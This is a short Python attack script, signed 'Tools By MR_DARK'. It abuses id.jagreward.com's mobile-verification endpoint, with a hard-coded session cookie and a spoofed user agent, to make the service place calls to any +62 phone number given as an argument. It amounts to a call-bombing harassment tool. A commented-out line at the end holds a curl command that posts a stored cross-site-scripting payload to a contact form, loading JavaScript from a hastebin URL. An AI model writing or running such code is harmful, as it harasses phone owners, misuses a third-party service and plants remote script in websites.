import os,sys,requests,json
from requests import post
sesid = sys.argv[1]
dark = requests.post(f"https://id.jagreward.com/member/verify-mobile/{sesid}/", data={"method": "CALL", "countryCode": "id",}, headers={"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",}).text
darkstat = dark.split('"result":')[1];
darkstatus = darkstat.split(',')[0];
bjer = dark.split('"message":"')[1];
mes = bjer.split('"')[0];
if darkstatus == "1":
     print ("[»] *Tools By MR_DARK*")
     print (f"*✔* *Calling* *+62{sesid}* *Success* :)")
     print (f"*Message:* {mes}")
else:
     print ("[»] *Tools By MR_DARK*")
     print (f"*✘* *Calling* *+62{sesid}* *gagal* :(")
     print (f"*Message:* {mes}")
     #os.system(f"curl --url {tar} --data 'nama=admin&email=admin%40gmail.com&pesan=%3Cscript+type%3D%22text%2Fjavascript%22+src%3D%22https%3A%2F%2Fhastebin.com%2Fraw%2Fudoxideleh%22%3E%3C%2Fscript%3E&submit=Kirim+Pesan'")